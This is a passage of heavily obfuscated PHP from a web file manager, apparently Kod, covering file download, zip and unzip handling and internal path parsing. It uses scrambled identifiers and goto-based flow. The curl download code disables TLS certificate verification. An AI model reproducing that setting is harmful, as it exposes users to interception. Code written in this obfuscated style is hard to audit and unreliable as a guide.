goto aõ®¯„‰ê; DÙã÷Œ¯: curl_close($a ïòŞÛ÷ì); fclose($B†¯õº”»§); $dœÂ¯–Œø = filesize(iconv_system($F©£¼ÒÉŸÉ)); goto a¤¤¹•¯‘å; c«ª“ÉÊ¡›: curl_setopt($a ïòŞÛ÷ì, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($a ïòŞÛ÷ì, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($a ïòŞÛ÷ì, CURLOPT_SSL_VERIFYHOST, 0); goto FïÏ„÷×¿×; aªœùÂ›¡î: curl_setopt($a ïòŞÛ÷ì, CURLOPT_USERAGENT, $BÌÑ¬îÖ[1482]); $dÖ«õË¥ëö = curl_exec($a ïòŞÛ÷ì); curl_progress_end($a ïòŞÛ÷ì); goto DÙã÷Œ¯; aõ®¯„‰ê: if ($eš…âßƒÖˆ) { curl_setopt($a ïòŞÛ÷ì, CURLOPT_RANGE, $dõÆ„”°¤— . $BÌÑ¬îÖ[706]); } curl_setopt($a ïòŞÛ÷ì, CURLOPT_FILE, $B†¯õº”»§); curl_setopt($a ïòŞÛ÷ì, CURLOPT_REFERER, get_url_link($e­›Æí¨)); goto c«ª“ÉÊ¡›; AƒƒŒÒÉĞ¿: return array($BÌÑ¬îÖ[1025] => !1, $BÌÑ¬îÖ[1027] => $BÌÑ¬îÖ[1493]); goto E¯„ñ‹˜Ë; a¤¤¹•¯‘å: if ($dœÂ¯–Œø < $fÁß³Ü÷ && $fÁß³Ü÷ != 0) { return array($BÌÑ¬îÖ[1025] => !1, $BÌÑ¬îÖ[1027] => $BÌÑ¬îÖ[1479]); } if ($dœÂ¯–Œø > $fÁß³Ü÷ && $fÁß³Ü÷ != 0) { return array($BÌÑ¬îÖ[1025] => !1, $BÌÑ¬îÖ[1027] => $BÌÑ¬îÖ[1487]); } if ($dÖ«õË¥ëö && filesize($F©£¼ÒÉŸÉ) != 0) { self::checkGzip($F©£¼ÒÉŸÉ); if (!@rename($F©£¼ÒÉŸÉ, $B³ÊÛ­ë°Ş)) { @unlink($B³ÊÛ­ë°Ş); $dÖ«õË¥ëö = @rename($F©£¼ÒÉŸÉ, $B³ÊÛ­ë°Ş); if (!$dÖ«õË¥ëö) { return array($BÌÑ¬îÖ[1025] => !1, $BÌÑ¬îÖ[1027] => $BÌÑ¬îÖ[1492]); } } return array($BÌÑ¬îÖ[1025] => !0, $BÌÑ¬îÖ[1027] => $BÌÑ¬îÖ[688]); } goto AƒƒŒÒÉĞ¿; e´Æ¢‰Íä‚: $BÌÑ¬îÖ =& $_SERVER[¼]; $F©£¼ÒÉŸÉ = $B³ÊÛ­ë°Ş . $BÌÑ¬îÖ[1478]; set_timeout(); goto D§Š«š¶; E¯„ñ‹˜Ë: } static function checkGzip($BÇïÖ©Ò¡) { goto b†Å¡Üœ…; b†Å¡Üœ…: $DßËùäÊ—à = $_SERVER[¼][1494]; $aàÂá“¢Ô = file_sub_str($BÇïÖ©Ò¡, 0, 2); if ($DßËùäÊ—à != $aàÂá“¢Ô) { return; } goto D®¶“Œ¼ô; aæëÜÒ®Ë: file_put_contents($BÇïÖ©Ò¡, $fÓÛ¬Îš¸½); goto Eó»Ã¦¦Ó; D®¶“Œ¼ô: ob_start(); readgzfile($BÇïÖ©Ò¡); $fÓÛ¬Îš¸½ = ob_get_clean(); goto aæëÜÒ®Ë; Eó»Ã¦¦Ó: } } goto e‘¶Ö Ï›; FŠĞÒ†´‘§: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $Bê…ç¶®¨ò; if (!$Bê…ç¶®¨ò) { $a®¨»¬ÇÆ = IO::init($_SERVER[¼][8]); } return $a®¨»¬ÇÆ; } private static function iconvSystem($bŸ§Ï…İ“â) { return self::local()->iconvSystem($bŸ§Ï…İ“â); } private static function iconvApp($dâåªÃÏ˜) { return self::local()->iconvApp($dâåªÃÏ˜); } public static function zip($cìíâÍ•, $a†Ñ±ÖéŞ½ = "\x7a\x69\160", $d‰ÙÌƒ‚Ş‹ = '', $Bñ©œ¹¯íİ = REPEAT_RENAME) { goto B¥í—Ó£¿; B¥í—Ó£¿: $dİŒ¼‰ˆá§ =& $_SERVER[¼]; $f°Ş¢¾—¦ = self::init($cìíâÍ•[0][$dİŒ¼‰ˆá§[75]]); $D¯‰ô³¡Ò® = self::info($cìíâÍ•[0][$dİŒ¼‰ˆá§[75]]); goto b‡¬“”«; b‡¬“”«: $FÍÉèÅÖ±Æ = !1; if (!$d‰ÙÌƒ‚Ş‹ && $f°Ş¢¾—¦->getType() == $dİŒ¼‰ˆá§[103]) { $b é©ŞÂÆ = self::zipFileList($cìíâÍ•); } else { $FÍÉèÅÖ±Æ = $d‰ÙÌƒ‚Ş‹ ? $d‰ÙÌƒ‚Ş‹ : TEMP_FILES . $dİŒ¼‰ˆá§[1018] . time() . rand_string(8) . $dİŒ¼‰ˆá§[8]; mk_dir($FÍÉèÅÖ±Æ); $b é©ŞÂÆ = self::zipFileList($cìíâÍ•, $FÍÉèÅÖ±Æ); } $D°§Ş®Ûäİ = $D¯‰ô³¡Ò®[$dİŒ¼‰ˆá§[28]]; goto a‰Ä³ƒ×“Ş; eß·’²Ì…ˆ: foreach ($b é©ŞÂÆ as $dö¯ÑšŞ¹± => $E‡¸•È‡í‘) { $b é©ŞÂÆ[$dö¯ÑšŞ¹±] = self::iconvSystem($E‡¸•È‡í‘); } KodArchive::create($aòó‘òŠ, $b é©ŞÂÆ); if (!IO::exist($eËãÄ”·ƒ)) { if ($FÍÉèÅÖ±Æ) { del_dir($FÍÉèÅÖ±Æ); } show_json(LNG($dİŒ¼‰ˆá§[1020]), !1); } goto aŒ£öï±; aŒ£öï±: if ($d‰ÙÌƒ‚Ş‹ || !$FÍÉèÅÖ±Æ) { if ($FÍÉèÅÖ±Æ && strstr($FÍÉèÅÖ±Æ, TEMP_FILES)) { $d¸è…ÅËÈ = $b é©ŞÂÆ = array(); recursion_dir($d³¥á’ÃÂò, $d¸è…ÅËÈ, $b é©ŞÂÆ, 0); foreach ($d¸è…ÅËÈ as $A¢×…Áğè˜) { del_dir($A¢×…Áğè˜); } foreach ($b é©ŞÂÆ as $aé‡åÜª™¡) { if ($aé‡åÜª™¡ == $aòó‘òŠ) { continue; } del_file($aé‡åÜª™¡); } } return $eËãÄ”·ƒ; } $FÑµ˜‡ŠîÇ = self::pathFather($D¯‰ô³¡Ò®[$dİŒ¼‰ˆá§[75]]); $eñ†¡Îë = self::move($eËãÄ”·ƒ, $FÑµ˜‡ŠîÇ, $Bñ©œ¹¯íİ); goto Aƒ¨¬æœÁô; a‰Ä³ƒ×“Ş: if (count($b é©ŞÂÆ) > 1) { $F›µ®Àƒ— = IO::info(IO::pathFather($D¯‰ô³¡Ò®[$dİŒ¼‰ˆá§[75]])); $D°§Ş®Ûäİ = $F›µ®Àƒ—[$dİŒ¼‰ˆá§[28]]; } $d³¥á’ÃÂò = $FÍÉèÅÖ±Æ; if (!$d³¥á’ÃÂò) { $d³¥á’ÃÂò = get_path_father($D¯‰ô³¡Ò®[$dİŒ¼‰ˆá§[75]]); $C£êÔÀøâ = IO::info($d³¥á’ÃÂò); if (!$C£êÔÀøâ[$dİŒ¼‰ˆá§[186]]) { show_json(LNG($dİŒ¼‰ˆá§[1019]), !1); } } goto F“›ÌÇ÷´í; Aƒ¨¬æœÁô: if (!$eñ†¡Îë) { del_dir($FÍÉèÅÖ±Æ); show_json(LNG($dİŒ¼‰ˆá§[1020]), !1); } del_dir($FÍÉèÅÖ±Æ); return $eñ†¡Îë; goto f×ó¬  Í¦; F“›ÌÇ÷´í: $eËãÄ”·ƒ = $d³¥á’ÃÂò . $D°§Ş®Ûäİ . $dİŒ¼‰ˆá§[93] . $a†Ñ±ÖéŞ½; $eËãÄ”·ƒ = get_filename_auto($eËãÄ”·ƒ, $dİŒ¼‰ˆá§[33], $Bñ©œ¹¯íİ); $aòó‘òŠ = self::iconvSystem($eËãÄ”·ƒ); goto eß·’²Ì…ˆ; f×ó¬  Í¦: } public static function unzip($CË“Ëã¦, $F¢òÄÁØ¸œ = "\162\145\160\154\141\x63\145") { goto e‘‡¹òñ«å; DœöØÀ·: if (!($fØÓôÄ‚Æ– = parent::info($d¯–Ÿ‹øˆÇ))) { show_json(LNG($fç–Ğ‡Ï­³[1022]), !1); } if (!($DŠé’Û¡ = parent::infoFull($fÆõ’Õ…’Ü))) { $fÆõ’Õ…’Ü = parent::mkdir($fÆõ’Õ…’Ü); $DŠé’Û¡ = array($fç–Ğ‡Ï­³[75] => $fÆõ’Õ…’Ü); } else { if (isset($DŠé’Û¡[$fç–Ğ‡Ï­³[366]]) && trim($DŠé’Û¡[$fç–Ğ‡Ï­³[75]], $fç–Ğ‡Ï­³[8]) != trim($fÆõ’Õ…’Ü, $fç–Ğ‡Ï­³[8])) { $AÚšÉ‚Ö‡ = KodIO::make($DŠé’Û¡[$fç–Ğ‡Ï­³[457]]); $FÅÀ×ÖëñÆ = parent::fileNameAuto($AÚšÉ‚Ö‡, $DŠé’Û¡[$fç–Ğ‡Ï­³[28]], REPEAT_RENAME_FOLDER, !0); $fÆõ’Õ…’Ü = parent::mkdir($AÚšÉ‚Ö‡ . $FÅÀ×ÖëñÆ); $DŠé’Û¡ = array($fç–Ğ‡Ï­³[75] => $fÆõ’Õ…’Ü); } } $fÆõ’Õ…’Ü = $DŠé’Û¡[$fç–Ğ‡Ï­³[75]]; goto EŸ£ßº°Ş•; F¤ğ‰‹¨˜: mk_dir($E‡õ„Ú¿à); $föõÌÚ²†× = self::fileExt($fØÓôÄ‚Æ–); $E¬Æ§òîÍÆ = $E‡õ„Ú¿à . $fç–Ğ‡Ï­³[93] . $föõÌÚ²†×; goto aœÁ®‹İº…; aœÁ®‹İº…: if (!@file_exists(self::iconvSystem($E¬Æ§òîÍÆ))) { $Fï×”‡Î¼ = self::localFilePath($d¯–Ÿ‹øˆÇ, $föõÌÚ²†×); $E¬Æ§òîÍÆ = $Fï×”‡Î¼ ? $Fï×”‡Î¼ : parent::download($d¯–Ÿ‹øˆÇ, $E¬Æ§òîÍÆ); } $E¬Æ§òîÍÆ = self::iconvSystem($E¬Æ§òîÍÆ); $eĞèÁ…™»… = isset($CË“Ëã¦[$fç–Ğ‡Ï­³[1023]]) ? $CË“Ëã¦[$fç–Ğ‡Ï­³[1023]] : $fç–Ğ‡Ï­³[1024]; goto BŞ˜•İƒÄæ; EŸ£ßº°Ş•: $CùÀ×øÉÌ• = self::tmpFileName($fØÓôÄ‚Æ–); $E‡õ„Ú¿à = TEMP_FILES . $CùÀ×øÉÌ•; del_dir($E‡õ„Ú¿à); goto F¤ğ‰‹¨˜; f…ö‹„ø: Hook::trigger($fç–Ğ‡Ï­³[1028], $E‡õ„Ú¿à); recursion_dir($E‡õ„Ú¿à, $CÈ“ä—ç²ä, $Då›˜“Ğ, 0); $aÔ®‡À«‚Õ = array_merge($CÈ“ä—ç²ä, $Då›˜“Ğ); goto cêÇ¾äº‘; BŞ˜•İƒÄæ: $C°×»ÜîøË = KodArchive::extract($E¬Æ§òîÍÆ, $E‡õ„Ú¿à . $fç–Ğ‡Ï­³[8], $eĞèÁ…™»…); self::archiveExt(); if (!$C°×»ÜîøË[$fç–Ğ‡Ï­³[1025]]) { show_json($fç–Ğ‡Ï­³[1026] . $C°×»ÜîøË[$fç–Ğ‡Ï­³[1027]], !1); } goto f…ö‹„ø; C¶‚×µ²¼ò: return !0; goto a±ĞÚø©»Ê; cêÇ¾äº‘: foreach ($aÔ®‡À«‚Õ as $cîã¶‰ğ›Ù) { $cîã¶‰ğ›Ù = self::iconvApp($cîã¶‰ğ›Ù); self::move($cîã¶‰ğ›Ù, $fÆõ’Õ…’Ü, $F¢òÄÁØ¸œ); } del_dir($E‡õ„Ú¿à); if (!$Fï×”‡Î¼) { del_file($E¬Æ§òîÍÆ); } goto C¶‚×µ²¼ò; e‘‡¹òñ«å: $fç–Ğ‡Ï­³ =& $_SERVER[¼]; $d¯–Ÿ‹øˆÇ = $CË“Ëã¦[$fç–Ğ‡Ï­³[75]]; $fÆõ’Õ…’Ü = $CË“Ëã¦[$fç–Ğ‡Ï­³[1021]]; goto DœöØÀ·; a±ĞÚø©»Ê: } public static function unzipList($fïæ“š˜Ü) { goto fÓ»ÂÕ×ÃË; BğĞË÷µ : $féƒ‚™ä¨¸ = self::iconvSystem($féƒ‚™ä¨¸); if ($Có›‹ô„š >= 0) { $bÕ¶‘˜°Ì× = isset($fïæ“š˜Ü[$bŒ˜¯Ù›ÏÅ[1033]]) ? $fïæ“š˜Ü[$bŒ˜¯Ù›ÏÅ[1033]] : !1; $F››¾Ìø¾ = isset($fïæ“š˜Ü[$bŒ˜¯Ù›ÏÅ[28]]) ? $fïæ“š˜Ü[$bŒ˜¯Ù›ÏÅ[28]] : $bŒ˜¯Ù›ÏÅ[33]; KodArchive::filePreview($féƒ‚™ä¨¸, $Có›‹ô„š, $bÕ¶‘˜°Ì×, $F››¾Ìø¾); self::archiveExt(); die; } $e«¤É™¿ÊŒ = KodArchive::listContent($féƒ‚™ä¨¸); goto bï‘÷‚ÊˆÀ; bà‡‡¬Ššè: return $e«¤É™¿ÊŒ[$bŒ˜¯Ù›ÏÅ[1027]]; goto F¬²®ŒËé«; bï‘÷‚ÊˆÀ: self::archiveExt(); del_dir($cù¹”¬õôë); if (!$e«¤É™¿ÊŒ[$bŒ˜¯Ù›ÏÅ[1025]]) { show_json($e«¤É™¿ÊŒ[$bŒ˜¯Ù›ÏÅ[1027]], !1); } goto BÕ†Ó¶§á; BÕ†Ó¶§á: $b‰ÍÅ±†ªİ = json_encode($e«¤É™¿ÊŒ[$bŒ˜¯Ù›ÏÅ[1027]]); self::setContent($cÖ‚‘ÍÚ§‰, $b‰ÍÅ±†ªİ); if (count($e«¤É™¿ÊŒ[$bŒ˜¯Ù›ÏÅ[1027]]) >= $Fºğ´á‰Û) { show_json(sprintf(LNG($bŒ˜¯Ù›ÏÅ[1031]), count($e«¤É™¿ÊŒ[$bŒ˜¯Ù›ÏÅ[1027]])), !1); } goto bà‡‡¬Ššè; fÓ»ÂÕ×ÃË: $bŒ˜¯Ù›ÏÅ =& $_SERVER[¼]; $b©ó™“æÕÑ = $fïæ“š˜Ü[$bŒ˜¯Ù›ÏÅ[75]]; $Có›‹ô„š = isset($fïæ“š˜Ü[$bŒ˜¯Ù›ÏÅ[1029]]) ? $fïæ“š˜Ü[$bŒ˜¯Ù›ÏÅ[1029]] : -1; goto Câé‘Ë´Œ˜; Câé‘Ë´Œ˜: $Fºğ´á‰Û = 50000; if (request_url_safe($b©ó™“æÕÑ)) { $AÏ–²ˆÕ = parse_url_query($b©ó™“æÕÑ); if (!isset($AÏ–²ˆÕ[$bŒ˜¯Ù›ÏÅ[75]])) { show_json($bŒ˜¯Ù›ÏÅ[1030], !1); } } $e¨İò¼Áˆ = isset($AÏ–²ˆÕ) ? $AÏ–²ˆÕ[$bŒ˜¯Ù›ÏÅ[75]] : $b©ó™“æÕÑ; goto DäÉ’–ææ; bğ°‘¶£: if (!is_dir($cù¹”¬õôë)) { mk_dir($cù¹”¬õôë); } $féƒ‚™ä¨¸ = $cù¹”¬õôë . $bŒ˜¯Ù›ÏÅ[8] . $D©è„£â·œ; if (!@file_exists(self::iconvSystem($féƒ‚™ä¨¸))) { if (isset($AÏ–²ˆÕ)) { url_request($b©ó™“æÕÑ, $bŒ˜¯Ù›ÏÅ[1032], $féƒ‚™ä¨¸); } else { $FØˆöøòÃ = self::localFilePath($b©ó™“æÕÑ, $c¤¾©ÎÆ¶°); $féƒ‚™ä¨¸ = $FØˆöøòÃ ? $FØˆöøòÃ : self::download($b©ó™“æÕÑ, $féƒ‚™ä¨¸); } } goto BğĞË÷µ ; F…ò½ó½•‰: if (isset($AÏ–²ˆÕ)) { $e³ÅØäã¤ = array($AÏ–²ˆÕ[$bŒ˜¯Ù›ÏÅ[75]], $AÏ–²ˆÕ[$bŒ˜¯Ù›ÏÅ[1029]], $AÏ–²ˆÕ[$bŒ˜¯Ù›ÏÅ[28]]); $D©è„£â·œ = md5(implode($bŒ˜¯Ù›ÏÅ[70], $e³ÅØäã¤)) . $bŒ˜¯Ù›ÏÅ[93] . get_path_ext($AÏ–²ˆÕ[$bŒ˜¯Ù›ÏÅ[28]]); } else { $e³ÅØäã¤ = array($D½®ò¾¤µå[$bŒ˜¯Ù›ÏÅ[28]], $D½®ò¾¤µå[$bŒ˜¯Ù›ÏÅ[75]], $D½®ò¾¤µå[$bŒ˜¯Ù›ÏÅ[77]]); $D©è„£â·œ = md5(implode($bŒ˜¯Ù›ÏÅ[70], $e³ÅØäã¤)) . $bŒ˜¯Ù›ÏÅ[93] . $c¤¾©ÎÆ¶°; } if ($Có›‹ô„š == -1) { $cÖ‚‘ÍÚ§‰ = IO_PATH_SYSTEM_TEMP . "\172\151\160\126\151\145\x77\57{$f‚—ñ¢}\x2f{$D©è„£â·œ}\56\154\157\x67"; $EëàÀÓ¡ÆÜ = self::infoFull($cÖ‚‘ÍÚ§‰); if ($EëàÀÓ¡ÆÜ) { $cÖ‚‘ÍÚ§‰ = $EëàÀÓ¡ÆÜ[$bŒ˜¯Ù›ÏÅ[75]]; $bõ™‡§¦‰„ = self::getContent($cÖ‚‘ÍÚ§‰); if ($bõ™‡§¦‰„) { $b‰ÍÅ±†ªİ = json_decode($bõ™‡§¦‰„, !0); if (count($b‰ÍÅ±†ªİ) >= $Fºğ´á‰Û) { show_json(sprintf(LNG($bŒ˜¯Ù›ÏÅ[1031]), count($b‰ÍÅ±†ªİ)), !1); } return $b‰ÍÅ±†ªİ; } } else { $cÖ‚‘ÍÚ§‰ = self::mkfile($cÖ‚‘ÍÚ§‰); } } $cù¹”¬õôë = TEMP_FILES . $f‚—ñ¢; goto bğ°‘¶£; DäÉ’–ææ: $D½®ò¾¤µå = self::info($e¨İò¼Áˆ); $c¤¾©ÎÆ¶° = self::fileExt($D½®ò¾¤µå); $f‚—ñ¢ = self::tmpFileName($D½®ò¾¤µå); goto F…ò½ó½•‰; F¬²®ŒËé«: } private static function fileExt($e“¨Òİ‚ñ«) { $FÚôåöÆŠ =& $_SERVER[¼]; $Bí‡¾ÂÇœô = $e“¨Òİ‚ñ«[$FÚôåöÆŠ[157]]; if ($Bí‡¾ÂÇœô == $FÚôåöÆŠ[1034]) { $e¯™††£ = $FÚôåöÆŠ[1035]; if (substr($e“¨Òİ‚ñ«[$FÚôåöÆŠ[28]], -strlen($e¯™††£)) == $e¯™††£) { $Bí‡¾ÂÇœô = $FÚôåöÆŠ[1036]; } } self::archiveExt($Bí‡¾ÂÇœô); return $Bí‡¾ÂÇœô; } private static function zipFileList($Aêœğàñ×°, $c¥è§²×” = false) { $a®›ŠÚ‡…½ =& $_SERVER[¼]; $f¸îô©ÂİÄ = array(); foreach ($Aêœğàñ×° as $Fï´†é²¾Ó) { $fèÕËÁø‘¹ = $Fï´†é²¾Ó[$a®›ŠÚ‡…½[75]]; if ($c¥è§²×”) { $fèÕËÁø‘¹ = self::copy($Fï´†é²¾Ó[$a®›ŠÚ‡…½[75]], $c¥è§²×”, $a®›ŠÚ‡…½[736]); } if ($fèÕËÁø‘¹ && self::local()->exist($fèÕËÁø‘¹)) { $f¸îô©ÂİÄ[$Fï´†é²¾Ó[$a®›ŠÚ‡…½[75]]] = $fèÕËÁø‘¹; } } if (!empty($f¸îô©ÂİÄ)) { return array_values($f¸îô©ÂİÄ); } show_json(LNG($a®›ŠÚ‡…½[1037]), !1); } public static function tmpFileName($eç–Ä½¢™) { $B «Ê¿È¼ =& $_SERVER[¼]; $a£¤åöïÚ = array($eç–Ä½¢™[$B «Ê¿È¼[28]], $eç–Ä½¢™[$B «Ê¿È¼[75]], $eç–Ä½¢™[$B «Ê¿È¼[77]], $eç–Ä½¢™[$B «Ê¿È¼[455]]); return md5(implode($B «Ê¿È¼[70], $a£¤åöïÚ)); } private static function localFilePath($e³Ó·‹è‹, $dÊ¡·¾÷”) { goto c·–½Ù¢¥ƒ; c·–½Ù¢¥ƒ: $d®ÆÓÎÏ¥à =& $_SERVER[¼]; if ($dÊ¡·¾÷” == $d®ÆÓÎÏ¥à[1038] && strtoupper(substr(PHP_OS, 0, 3)) == $d®ÆÓÎÏ¥à[1039]) { return !1; } $FõîÜâ = KodIO::parse($e³Ó·‹è‹); goto Cç“¡ğø‰‰; Cç“¡ğø‰‰: if ($FõîÜâ[$d®ÆÓÎÏ¥à[29]] == KodIO::KOD_SOURCE) { $aŸÖ…é‹ñ = Model($d®ÆÓÎÏ¥à[744])->fileInfoGet(KodIO::sourceID($e³Ó·‹è‹)); if (!$aŸÖ…é‹ñ[$d®ÆÓÎÏ¥à[75]]) { show_json($d®ÆÓÎÏ¥à[1040], !1); } $e³Ó·‹è‹ = $aŸÖ…é‹ñ[$d®ÆÓÎÏ¥à[75]]; } $D·†Ï›‡Şİ = self::init($e³Ó·‹è‹); $dÂìï‚¾ = $D·†Ï›‡Şİ->getType(); goto eå¯¯Ø»°Â; eå¯¯Ø»°Â: if ($dÂìï‚¾ == $d®ÆÓÎÏ¥à[103] || $dÂìï‚¾ == $d®ÆÓÎÏ¥à[1041]) { if (!$D·†Ï›‡Şİ->exist($D·†Ï›‡Şİ->path)) { show_json(LNG($d®ÆÓÎÏ¥à[102]), !1); } return $D·†Ï›‡Şİ->path; } return !1; goto dƒ™âĞÓÓİ; dƒ™âĞÓÓİ: } private static function archiveExt($f‚…¹¿«²ï = '') { $GLOBALS[$_SERVER[¼][1042]] = $f‚…¹¿«²ï; } } class KodIO { const KOD_SOURCE = "\x7b\x73\157\x75\162\143\145\x7d"; const KOD_USER_RECYCLE = "\x7b\165\x73\x65\x72\122\x65\x63\x79\x63\154\145\x7d"; const KOD_USER_FAV = "\173\165\x73\x65\162\106\x61\166\x7d"; const KOD_USER_FILE_TAG = "\173\x75\163\145\x72\x46\x69\154\x65\124\141\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\x75\x73\145\x72\x46\x69\x6c\x65\x54\x79\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\157\165\160\x52\157\157\x74\x53\145\154\x66\x7d"; const KOD_USER_SHARE = "\173\165\163\145\x72\123\x68\x61\162\145\x7d"; const KOD_USER_SHARE_LINK = "\173\165\x73\x65\x72\123\150\x61\x72\145\114\151\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\x68\141\x72\145\124\157\115\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\163\x68\141\x72\145\111\164\145\x6d\175"; const KOD_SHARE_LINK = "\173\163\150\141\x72\145\111\x74\x65\x6d\114\151\x6e\153\175"; const KOD_SEARCH = "\173\x73\x65\141\x72\143\150\175"; const KOD_BLOCK = "\x7b\142\x6c\x6f\143\153\x7d"; const KOD_IO = "\x7b\151\157\175"; const KOD_USER_RECENT = "\x7b\165\x73\x65\162\x52\x65\x6e\x63\145\x6e\164\175"; const KOD_USER_DRIVER = "\173\144\162\151\x76\x65\162\x7d"; public static function typeList() { $cĞë¥°ª =& $_SERVER[¼]; return array($cĞë¥°ª[1043] => self::KOD_SOURCE, $cĞë¥°ª[1044] => self::KOD_USER_RECYCLE, $cĞë¥°ª[1045] => self::KOD_USER_FAV, $cĞë¥°ª[1046] => self::KOD_USER_FILE_TAG, $cĞë¥°ª[1047] => self::KOD_USER_FILE_TYPE, $cĞë¥°ª[1048] => self::KOD_GROUP_ROOT_SELF, $cĞë¥°ª[1049] => self::KOD_USER_SHARE, $cĞë¥°ª[1050] => self::KOD_USER_SHARE_LINK, $cĞë¥°ª[1051] => self::KOD_USER_SHARE_TO_ME, $cĞë¥°ª[1052] => self::KOD_SHARE_ITEM, $cĞë¥°ª[1053] => self::KOD_SHARE_LINK, $cĞë¥°ª[1054] => self::KOD_SEARCH, $cĞë¥°ª[1055] => self::KOD_BLOCK, $cĞë¥°ª[1056] => self::KOD_IO, $cĞë¥°ª[1057] => self::KOD_USER_RECENT, $cĞë¥°ª[1058] => self::KOD_USER_DRIVER); } public static function parse($c‚®¸¡ĞøÔ) { goto Fù­ßµƒœ‚; bŸ²©Ø•ªÉ: preg_match($b¡ëÙğµ‹…[1059], $c‚®¸¡ĞøÔ, $c×¶ÄØ‚«¬); $EŒêí»îÛ = array($b¡ëÙğµ‹…[385] => !1, $b¡ëÙğµ‹…[1060] => !1, $b¡ëÙğµ‹…[382] => !1, $b¡ëÙğµ‹…[75] => $c‚®¸¡ĞøÔ, $b¡ëÙğµ‹…[1005] => !1, $b¡ëÙğµ‹…[1004] => $b¡ëÙğµ‹…[33]); if (is_array($c×¶ÄØ‚«¬) && count($c×¶ÄØ‚«¬) == 5) { $c›å˜¹¬¶ = $b¡ëÙğµ‹…[1061] . $c×¶ÄØ‚«¬[2] . $b¡ëÙğµ‹…[312]; if (in_array($c›å˜¹¬¶, $fÀÄëğæñä)) { $EŒêí»îÛ[$b¡ëÙğµ‹…[1005]] = $c×¶ÄØ‚«¬[1]; $EŒêí»îÛ[$b¡ëÙğµ‹…[29]] = $c›å˜¹¬¶; $EŒêí»îÛ[$b¡ëÙğµ‹…[1062]] = substr($c›å˜¹¬¶, 1, -1); $EŒêí»îÛ[$b¡ëÙğµ‹…[364]] = $c×¶ÄØ‚«¬[3]; } $EŒêí»îÛ[$b¡ëÙğµ‹…[1004]] = $c×¶ÄØ‚«¬[4]; } goto cÏíìÁâ; cÏíìÁâ: $DôØå¬Î³ = array($b¡ëÙğµ‹…[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $EŒêí»îÛ[$b¡ëÙğµ‹…[1063]] = in_array($EŒêí»îÛ[$b¡ëÙğµ‹…[29]], $DôØå¬Î³); return $EŒêí»îÛ; goto aÄ¦Ú‚Šô; Fù­ßµƒœ‚: $b¡ëÙğµ‹… =& $_SERVER[¼]; $c‚®¸¡ĞøÔ = self::clear($c‚®¸¡ĞøÔ); $fÀÄëğæñä = array_values(self::typeList()); goto bŸ²©Ø•ªÉ; aÄ¦Ú‚Šô: } public static function clear($d¸ƒ…¬ÖÌ) { goto c§´¦ƒØ˜; c§´¦ƒØ˜: $BÇÀµÙï’‚ =& $_SERVER[¼]; $d¸ƒ…¬ÖÌ = str_replace($BÇÀµÙï’‚[95], $BÇÀµÙï’‚[8], $d¸ƒ…¬ÖÌ); $fè¨ÃÔ“› = $BÇÀµÙï’‚[1064]; goto aÄöõ…ƒ¡; aÄöõ…ƒ¡: if (substr($d¸ƒ…¬ÖÌ, 0, 3) == $BÇÀµÙï’‚[1065]) { $d¸ƒ…¬ÖÌ = substr($d¸ƒ…¬ÖÌ, 3); } while (strstr($d¸ƒ…¬ÖÌ, $fè¨ÃÔ“›)) { $d¸ƒ…¬ÖÌ = str_replace($fè¨ÃÔ“›, $BÇÀµÙï’‚[8], $d¸ƒ…¬ÖÌ); } $d¸ƒ…¬ÖÌ = preg_replace($BÇÀµÙï’‚[1066], $BÇÀµÙï’‚[8], $d¸ƒ…¬ÖÌ); goto d«ï½ƒ‘Öï; d«ï½ƒ‘Öï: if ($d¸ƒ…¬ÖÌ == $BÇÀµÙï’‚[8]) { return $BÇÀµÙï’‚[8]; } $d¸ƒ…¬ÖÌ = rtrim($d¸ƒ…¬ÖÌ, $BÇÀµÙï’‚[8]); return $d¸ƒ…¬ÖÌ; goto Fó°öƒ ÎÊ; Fó°öƒ ÎÊ: } public static function sourceID($DÒùî†õø) { $Föñ‡ŞíÅà =& $_SERVER[¼]; $aÒÚ¤‚ØŞ = self::parse($DÒùî†õø); if ($aÒÚ¤‚ØŞ[$Föñ‡ŞíÅà[29]] !== self::KOD_SOURCE) { show_json(LNG($Föñ‡ŞíÅà[1067]), !1); } return $aÒÚ¤‚ØŞ[$Föñ‡ŞíÅà[364]]; } public static function make($EÊğ«™Îù•) { if (!$EÊğ«™Îù•) { return !1; } return self::makePath(self::KOD_SOURCE, intval($EÊğ«™Îù•)); } public static function makeShare($a¬Ó‘†ÄŞ, $aª³àŠ…µØ) { return self::makePath(self::KOD_SHARE_ITEM, $a¬Ó‘†ÄŞ, $aª³àŠ…µØ); } public static function makeFileTypePath($c‘É ¸ƒà¼) { return self::makePath(self::KOD_USER_FILE_TYPE, $c‘É ¸ƒà¼); } public static function makeFileTagPath($BÚ¸ÆÓ¯¸‚) { return self::makePath(self::KOD_USER_FILE_TAG, $BÚ¸ÆÓ¯¸‚); } public static function makePath($a‡Ó¬»Ñ¶, $aî–²Ø¬ˆ = '', $DŠ«‚‡ñ½Ô = '') { $CÎá‘²‰ì =& $_SERVER[¼]; $aöƒÚì¯ƒ  = substr($a‡Ó¬»Ñ¶, 1, -1); $C¾¼¦—Šèß = $CÎá‘²‰ì[1068] . $aöƒÚì¯ƒ  . $CÎá‘²‰ì[1069] . $aî–²Ø¬ˆ . $CÎá‘²‰ì[1070]; $C¾¼¦—Šèß = $DŠ«‚‡ñ½Ô ? $C¾¼¦—Šèß . $DŠ«‚‡ñ½Ô . $CÎá‘²‰ì[8] : $C¾¼¦—Šèß; return $C¾¼¦—Šèß; } public static function hashPath($Aî…‘¦¸ß) { $Fê¸ÃÀƒø­ =& $_SERVER[¼]; $Fİª„ˆ¦¿õ = is_array($Aî…‘¦¸ß) ? $Aî…‘¦¸ß : IO::info($Aî…‘¦¸ß); $d˜…Õ‘ÓĞ´ = _get($Fİª„ˆ¦¿õ, $Fê¸ÃÀƒø­[1071], $Fê¸ÃÀƒø­[33]); if (!$d˜…Õ‘ÓĞ´) { $D¡’ß¯™‘Ä = 